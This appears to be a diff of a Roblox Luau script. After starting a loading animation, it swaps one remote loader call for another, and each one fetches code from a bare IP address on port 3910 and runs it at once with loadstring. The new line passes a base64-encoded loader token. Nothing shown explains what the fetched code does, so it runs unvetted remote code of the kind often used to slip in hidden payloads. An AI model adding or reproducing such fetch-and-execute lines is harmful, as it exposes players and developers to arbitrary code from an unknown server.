@@ -187,5 +187,4 @@ end
 -- start loading animation
 task.spawn(animateLoading)
 
-ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImMxNmMyOTc4LTFhZDAtNDY1Yy04MGVkLTVkMDEzZjdhN2ZhOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
